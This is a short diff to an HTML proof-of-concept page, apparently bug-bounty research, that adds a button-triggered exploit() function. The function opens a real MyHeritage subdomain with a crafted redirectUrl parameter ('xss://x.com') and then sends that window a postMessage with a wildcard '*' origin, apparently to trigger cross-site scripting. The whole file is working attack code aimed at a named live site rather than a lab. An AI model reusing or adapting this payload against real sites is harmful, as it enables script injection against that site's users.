@@ -2,7 +2,9 @@
 <html>
   <body>
     <h1>postMessage</h1>
+     <button onclick="exploit()">click</button>
     <script>
+       function exploit() {
       const target = window.open("https://influencers.myheritage.com/dansmescordes/?redirectUrl=xss://x.com");
          
       setTimeout(() => {
@@ -13,6 +15,7 @@
           "*"
         );
       }, 1000);
+       }
     </script>
   </body>
 </html>
